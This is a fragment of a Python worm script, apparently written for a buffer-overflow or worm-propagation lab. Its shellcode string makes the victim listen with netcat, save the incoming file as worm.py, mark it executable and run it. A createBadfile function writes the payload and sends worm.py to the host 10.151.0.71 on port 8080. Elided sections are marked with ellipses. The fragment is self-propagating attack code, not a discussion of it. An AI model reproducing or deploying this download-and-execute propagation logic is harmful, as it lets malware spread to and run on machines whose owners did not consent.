...
shellcode= (
   ...
   " nc -lnv 8080 > worm.py; chmod +x worm.py; ./worm.py        " #as per the approach 2, we are adding the pilot code here
   "                                                           *"
...
def createBadfile():
   ...
   with open('badfile', 'wb') as f:
      f.write(content)
   subprocess.run(["nc -w5 10.151.0.71 8080 < worm.py"], shell=True) #adding the subprocess here with -w5 option as stated in server/ 										client details
